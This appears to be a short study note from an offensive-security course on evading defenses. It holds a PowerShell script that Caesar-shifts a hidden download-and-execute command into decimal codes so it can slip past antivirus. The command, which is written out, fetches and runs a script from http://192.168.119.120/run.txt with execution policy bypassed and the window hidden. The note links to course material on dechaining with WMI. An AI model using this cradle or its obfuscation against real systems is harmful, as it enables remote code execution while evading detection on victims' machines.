```powershell
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object
system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
[string]$output = ""
$payload.ToCharArray() | %{
	[string]$thischar = [byte][char]$_ + 17
	if($thischar.Length -eq 1)
	{
		$thischar = [string]"00" + $thischar
		$output += $thischar
	}
	elseif($thischar.Length -eq 2)
	{
		$thischar = [string]"0" + $thischar
		$output += $thischar
	}
	elseif($thischar.Length -eq 3)
	{
		$output += $thischar
	}
}
$output | clip
```

Script converts Bytes into Decimal code and using Caesars Encryption
It outputs (copies into clipboard) the payload.

MoreInfo:
![[Evasion Techniques and Breaching Defenses#6 8 2 Dechaining with WMI]]